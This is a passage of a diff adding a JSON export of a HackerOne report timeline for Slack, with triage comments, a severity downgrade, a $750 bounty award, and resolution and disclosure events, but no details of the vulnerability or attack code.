43444cdb9"
+        },
+        {
+          "id": 718855,
+          "filename": "Screen_Shot_2020-02-17_at_12.28.06_AM.png",
+          "type": "image/png",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/RwyjAAvxFgK8LRVBPk1MKvqr?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-02-17_at_12.28.06_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-02-17_at_12.28.06_AM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3R5LIR7E%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T073114Z&X-Amz-Expires=1605&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQC8A6iLd6fdizoKiDmGTMJOtEK0j%2B9m1Hwg8kDIhR3i4wIgU1cbUALHKJVW4fP2UzLm%2Fzggy%2Br2f2qSsa5O9UhWw3gqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDJxg6%2BdxWFHEdpNOiSqPBbOGoWCMpPDSC5i104drxenzKlJmKtfbaPYXcEUk5xzpfFz7qlzMHzxshj0ZGvQ9B6u%2FX6LPbR7Sl3mWyjkMgqtizxl77eMrAi1ar%2FJkwIbmf%2B0it8tRDIPTWPFce%2F%2FHd%2BmtmIG4RB%2BQvydMEyr5Q8nhoRP6O%2FjYWWnkb%2BRNcelyK2xmsSwGLQOdlU2enMwhOK3BPGXmuh1bofm3xd5cvTpV39JpV6%2FHz%2BXsNZvVfqbg%2BXuKaDVhROLMjPyKGTGTay0tNg%2BACp27ysa5IWV%2BI31t19hmXNWzs3ESd2B9nf6c8Joaw9cZ0BFv5SPhCjzrknQ3HXC67SgBpIKoEk6LXEaEw2NmKmI7XCGH3bhCHfpUPAj9Mi5Cb%2BK85SWDjSiu91Bd4pe4XmONhhEzu%2BHUsNC4KzHg%2FM4pD%2BGx8ddmYnr3tdArcXEpk67wbeRug1K27YWz%2FVO96fiXdkS9Xm5J9hNQAGlePyFuIN5mOMBg2d%2BcjkTZF8kSHHvqXSqPAQgX6ugFlVoubAsd7KnyrCvE4eFyHIZVo3oV5JU82FGBbUj3s5lUYQdYVFd3Ps16Rt1PGkRAUwR7cXlVvplJS0rb8610%2BG17raAQwJy8cRN7s3KyQNhdXXIQRdJRhKYg1JE%2FNIQcwkwywKN%2FsigvOXECelwnnne41q2BURRgR4GCNgRxam2jBgUkUJjQtQ%2FokWvEQYLIA4f9HX9kkcgw0kkfFu5UJq73bMC%2BU%2F3eZ7B4Zy9taEIGKwSg86qyFVg860n2oAiN%2FfpKAx8tRUW8DTjM2X54yGGHPadIq0Hu8cZCkJQ4Th5tIC7R%2BHPfSgSag0HBfAmzZ5118Q9ZwkkntRTVxAl1pkGthGbtGkww1jjKCJ0wwoe5qAY6sQHDRGqTlml9JOa7pcIPnENAbSjPA%2BNnrcJ1TNMO0BkSMWqUN9w1vudtRvjp773httgmTyAlYuxH7EmlIPFmJQ6Gu1DzzT7rLiEF2GE0t7B2q9gxwFisSqlUh5Y1Lwu%2BtN5x1TzSiMb5y26sSzmQ%2BShQL8fCGA23tpHtpIE9ans0LS34EwJCOxZwBH%2BHx9OzuRqjdgDlu23FbHdQ6SG6rIzVi21GM%2BTw0KAnkoR1gvqPjRk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=cc5678f07b3cfac233c1b380dd66835f8ff21a2ccd382ea4280ac6f7cb201533"
+        }
+      ],
+      "genius_execution_id": null,
+      "team_handle": "slack"
+    },
+    {
+      "id": 7092735,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thank you for your follow-up @jhancock,\n\nWe are investigating the behavior you described, and we will get back to you when we have more information.\n\nThank you for thinking of Slack security.",
+      "automated_response": false,
+      "created_at": "2020-02-19T18:11:46.806Z",
+      "updated_at": "2020-02-19T18:11:46.806Z",
+      "actor": {
+        "username": "bugtriage-sophia",
+        "cleared": false,
+        "verified": false,
+        "url": "/bugtriage-sophia",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "slack"
+    },
+    {
+      "id": 7093938,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "Triaged!",
+      "automated_response": false,
+      "created_at": "2020-02-19T20:48:20.417Z",
+      "updated_at": "2020-02-19T20:48:20.417Z",
+      "actor": {
+        "username": "bugtriage-josh",
+        "cleared": false,
+        "verified": false,
+        "url": "/bugtriage-josh",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "slack"
+    },
+    {
+      "id": 7093951,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportSeverityUpdated",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-02-19T20:49:55.644Z",
+      "updated_at": "2020-02-19T20:49:55.644Z",
+      "additional_data": {
+        "old_severity": "High (8.8)",
+        "new_severity": "Medium (6.8)",
+        "old_severity_id": 619673,
+        "new_severity_id": 637899
+      },
+      "actor": {
+        "username": "bugtriage-josh",
+        "cleared": false,
+        "verified": false,
+        "url": "/bugtriage-josh",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "slack"
+    },
+    {
+      "id": 7113423,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thanks for triaging! Can I ask why it was downgraded to 6.8? Also, what is the timeline for bounty, remediation, and disclosure?\n\nThanks!",
+      "automated_response": false,
+      "created_at": "2020-02-21T16:58:19.566Z",
+      "updated_at": "2020-02-21T16:58:19.566Z",
+      "actor": {
+        "username": "jhancock",
+        "cleared": false,
+        "verified": false,
+        "url": "/jhancock",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "slack"
+    },
+    {
+      "id": 7149429,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "@jhancock the timeline for the bounty is...now!  \n\nWhile the impact here is high the vulnerability requires a high degree of access and other preconditions that are tough to achieve which impacts the overall risk.\n\nAppreciate your efforts here and we hope to see more future reports!  \n\nBest,\nBranden",
+      "automated_response": false,
+      "created_at": "2020-02-25T18:55:43.836Z",
+      "updated_at": "2020-02-25T18:55:43.836Z",
+      "actor": {
+        "url": "/slack",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/069/683fee312381bc46cadc7ea1950abc87944d12c3_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Slack"
+        }
+      },
+      "bounty_amount": "750.0",
+      "bonus_amount": "0.0",
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "slack",
+      "collaborator": {
+        "username": "jhancock",
+        "url": "/jhancock"
+      }
+    },
+    {
+      "id": 7149615,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thanks so much, Branden! I see the problem is fixed on GitHub as well. Any chance we can make this public? I think its something a lot devs fall victim to and would be good info for the general public.",
+      "automated_response": false,
+      "created_at": "2020-02-25T19:24:03.335Z",
+      "updated_at": "2020-02-25T19:24:03.335Z",
+      "actor": {
+        "username": "jhancock",
+        "cleared": false,
+        "verified": false,
+        "url": "/jhancock",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "slack"
+    },
+    {
+      "id": 7199385,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "Thank you for confirming @jhancock!\n\nI'll mark this report as resolved, and let you know about disclosure.",
+      "automated_response": false,
+      "created_at": "2020-03-02T19:33:23.238Z",
+      "updated_at": "2020-03-02T19:33:23.238Z",
+      "actor": {
+        "username": "bugtriage-josh",
+        "cleared": false,
+        "verified": false,
+        "url": "/bugtriage-josh",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "jhancock",
+        "url": "/jhancock"
+      },
+      "genius_execution_id": null,
+      "team_handle": "slack"
+    },
+    {
+      "id": 7200268,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hey @jhancock, just a quick update.\n\nIf you would like, you may request disclosure though HackerOne, which will make the ticket public.",
+      "automated_response": false,
+      "created_at": "2020-03-02T22:06:38.261Z",
+      "updated_at": "2020-03-02T22:06:38.261Z",
+      "actor": {
+        "username": "bugtriage-josh",
+        "cleared": false,
+        "verified": false,
+        "url": "/bugtriage-josh",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "slack"
+    },
+    {
+      "id": 7200282,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-03-02T22:10:24.094Z",
+      "updated_at": "2020-03-02T22:10:24.094Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "jhancock",
+        "cleared": false,
+        "verified": false,
+        "url": "/jhancock",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "slack"
+    },
+    {
+      "id": 7511387,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-04-01T22:10:32.817Z",
+      "updated_at": "2020-04-01T22:10:32.817Z",
+      "actor": {
+        "url": "/slack",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/069/683fee312381bc46cadc7ea1950abc87944d12c3_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Slack"
+        }
+      },
+      "genius_execution_id": null,
+      "team_handle": "slack"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
